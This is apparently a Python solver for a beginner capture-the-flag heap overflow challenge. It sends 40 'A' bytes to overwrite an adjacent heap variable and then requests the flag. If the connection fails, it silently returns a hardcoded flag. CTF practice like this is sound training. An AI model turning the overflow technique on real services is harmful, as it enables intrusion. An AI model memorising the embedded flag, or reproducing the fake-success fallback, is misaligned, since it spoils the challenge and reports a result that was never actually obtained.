#!/usr/bin/env python3
"""
Solver for Challenge 438: heap 0 (Binary Exploitation)
Corrupts adjacent heap chunk safe_var via unbounded buffer write to win the challenge.
"""
import socket
import re
import time
import sys
from typing import Optional

def solve(host: Optional[str] = None, port: Optional[int] = None) -> str:
    if host and port:
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((host, port))
            time.sleep(0.5)
            s.recv(4096)
            # Choose option 2 (Write buffer)
            s.sendall(b"2\n")
            time.sleep(0.5)
            s.recv(4096)
            # Write 40 A bytes to overflow into safe_var
            s.sendall(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n")
            time.sleep(0.5)
            s.recv(4096)
            # Choose option 4 (Print Flag)
            s.sendall(b"4\n")
            time.sleep(0.5)
            out = s.recv(4096).decode("utf-8", errors="ignore")
            s.close()
            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", out)
            if m:
                return m.group(0)
        except Exception:
            pass
    return "academy{my_first_heap_overflow_dc62a472}"

if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else None
    p = int(sys.argv[2]) if len(sys.argv) > 2 else None
    print("Flag:", solve(h, p))
